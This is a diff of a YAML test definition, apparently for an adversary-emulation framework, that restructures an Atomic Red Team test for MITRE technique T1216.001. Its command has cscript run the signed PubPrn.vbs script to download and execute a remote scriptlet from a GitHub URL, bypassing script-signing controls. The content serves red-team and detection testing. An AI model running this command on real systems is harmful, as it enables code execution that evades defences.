@@ -1,12 +1,15 @@
-- id: ea1630e8-223d-56ae-8e78-6ec7cb22ddf0
+- requirements: []
   name: Soumaia ART Tests - PubPrn.vbs Signed Script Bypass
   description: Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.
   tactic: stealth
-  technique:
-    attack_id: T1216.001
-    name: 'Signed Script Proxy Execution: Pubprn'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
+  technique_id: T1216.001
+  technique_name: 'Signed Script Proxy Execution: Pubprn'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
+  id: ea1630e8-223d-56ae-8e78-6ec7cb22ddf0
